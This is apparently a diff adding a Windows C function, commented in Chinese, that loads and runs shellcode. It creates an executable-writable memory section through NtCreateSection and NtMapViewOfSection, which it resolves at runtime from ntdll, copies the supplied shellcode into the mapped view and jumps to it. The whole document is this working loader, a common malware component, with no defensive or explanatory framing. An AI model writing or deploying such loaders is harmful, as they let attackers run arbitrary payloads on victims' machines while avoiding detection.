@@ -1,0 +1,31 @@
+// NtCreateSection注入加载方式：使用NtCreateSection和映射执行
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] NtCreateSection注入方式执行Shellcode\n");
+#endif
+    typedef NTSTATUS (WINAPI *PFN_NtCreateSection)(HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
+    typedef NTSTATUS (WINAPI *PFN_NtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+    
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PFN_NtCreateSection pNtCreateSection = (PFN_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+    PFN_NtMapViewOfSection pNtMapViewOfSection = (PFN_NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
+    
+    HANDLE hSection = NULL;
+    LARGE_INTEGER sectionSize;
+    sectionSize.QuadPart = shellcodeSize;
+    
+    if (pNtCreateSection && pNtMapViewOfSection) {
+        pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+        
+        PVOID baseAddress = NULL;
+        SIZE_T viewSize = shellcodeSize;
+        pNtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddress, 0, 0, NULL, &viewSize, 1, 0, PAGE_EXECUTE_READWRITE);
+        
+        if (baseAddress) {
+            memcpy(baseAddress, shellcode, shellcodeSize);
+            ((void(*)())baseAddress)();
+        }
+        
+        if (hSection) CloseHandle(hSection);
+    }
+}
